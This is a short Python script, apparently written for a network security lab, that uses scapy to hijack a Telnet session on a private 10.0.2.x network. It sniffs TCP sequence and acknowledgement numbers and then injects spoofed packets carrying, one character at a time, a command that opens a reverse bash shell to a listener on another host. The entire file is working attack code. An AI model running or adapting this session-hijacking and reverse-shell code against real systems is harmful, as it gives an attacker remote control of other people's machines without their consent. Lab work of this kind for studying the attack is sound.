#!/usr/bin/python
from scapy.all import *
import thread

def attack(a,b):
    print("wait for attack")
    temp=raw_input()
    print("attack start")
    ip=IP(src="10.0.2.133",dst="10.0.2.134")

    cmd="/bin/bash -i > /dev/tcp/10.0.2.129/9090 0<&1 2>&1"
    i=0
    tempseq=seq
    tempack=ack
    for char in cmd:
        tcp=TCP(sport=sport,dport=23,flags=flag,seq=tempseq+i,ack=tempack+i)
        data=char
        pkt=ip/tcp/data
        send (pkt)
        i=i+1

    tcp=TCP(sport=sport,dport=23,flags=flag,seq=tempseq+i,ack=tempack+i)
    data="0d00".decode("hex")
    pkt=ip/tcp/data
    send (pkt)

def print_pkt(pkt):
    global sport
    global ack
    global seq
    global flag
    if pkt[TCP].dport==23:
        print("---------------------------------")
        print("dst port="+str(pkt[TCP].sport))
        sport=pkt[TCP].sport
        print("ack="+str(pkt[TCP].ack))
        ack=pkt[TCP].ack
        print("seq="+str(pkt[TCP].seq))
        seq=pkt[TCP].seq
        flag=pkt[TCP].flags
  #  prtin("window="+pkt[TCP].window)

sport=0
ack=0
seq=0
flag=0
thread.start_new_thread( attack ,(0,0))
pkt=sniff(filter='tcp',prn=print_pkt)##1.1A